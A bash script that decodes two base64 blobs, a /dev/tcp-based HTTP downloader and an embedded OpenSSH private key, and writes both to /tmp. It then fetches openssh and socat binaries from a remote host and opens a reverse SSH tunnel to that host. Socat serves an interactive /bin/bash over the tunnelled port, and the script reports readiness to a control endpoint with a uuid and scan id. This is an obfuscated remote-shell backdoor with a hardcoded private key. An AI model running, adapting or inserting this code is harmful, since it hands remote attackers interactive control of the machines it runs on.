#!/bin/bash

SCRIPT='ZG93bmxvYWRfc2NyaXB0KCkgewogIHJlYWQgLXIgcHJvdG8gc2VydmVyIHBhdGggPDw8IiQocHJpbnRmICclcycgIiR7MS8vLy8gfSIpIgogIGlmIFsgIiRwcm90byIgIT0gImh0dHA6IiBdOyB0aGVuCiAgICBwcmludGYgPiYyICJzb3JyeSwgJXMgc3VwcG9ydHMgb25seSBodHRwXG4iICIke0ZVTkNOQU1FWzBdfSIKICAgIHJldHVybiAxCiAgZmkKICBET0M9LyR7cGF0aC8vIC8vfQogIEhPU1Q9JHtzZXJ2ZXIvLzoqfQogIFBPUlQ9JHtzZXJ2ZXIvLyo6fQogIFsgIiR7SE9TVH0iID0gIiR7UE9SVH0iIF0gJiYgUE9SVD04MAoKICBleGVjIDM8PiIvZGV2L3RjcC8ke0hPU1R9LyRQT1JUIgogIHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIke0RPQ30iICIke0hPU1R9IiA+JjMKICAod2hpbGUgcmVhZCAtciBsaW5lOyBkbwogICBbICIkbGluZSIgPSAkJ1xyJyBdICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9Cgpkb3dubG9hZF9zY3JpcHQgJDE='
SCRIPT=$(echo $SCRIPT | base64 -d)
KEY="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMTcyV1N4eGtxSmdoZTh2TjA4dEg1bTR0bU1qSDNOaTF0MnV6dm1tOEQzd0FBQUpqb05rTno2RFpECmN3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTE3MldTeHhrcUpnaGU4dk4wOHRINW00dG1NakgzTmkxdDJ1enZtbThEM3cKQUFBRUFYUlV3Um8vNlJQLzg2OHI0eDU0K2dINml0c3IreThoVDgxUjdBcVpNSDdUWHZaWkxIR1NvbUNGN3k4M1R5MGZtYgppMll5TWZjMkxXM2E3TythYndQZkFBQUFEblZ6WlhKQVlYSmphR3hwYm5WNEFRSURCQVVHQnc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
KEY=$(echo $KEY | base64 -d)

bash -c "printf '%s' \"$SCRIPT\" > /tmp/download"
bash -c "printf '%s' \"$KEY\" > /tmp/ssh_key"

bash -c "chmod +x /tmp/download"
bash -c "chmod 600 /tmp/ssh_key"

bash -c "/tmp/download/ http://$HOSTIP:1703/static/bin/openssh > /tmp/openssh"
bash -c "/tmp/download/ http://$HOSTIP:1703/static/bin/socat > /tmp/socat"

bash -c "chmod +x /tmp/openssh"
bash -c "chmod +x /tmp/socat"

bash -c "ssh -i /tmp/ssh_key -R localhost:16139:localhost:$port stuff@$HOSTIP -N -p 12936 &"

bash -c "/tmp/socat TCP-LISTEN:16139,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"

/tmp/download http://$HOSTIP/api/ready?uuid=$CONTROL&id=$SCAN_ID


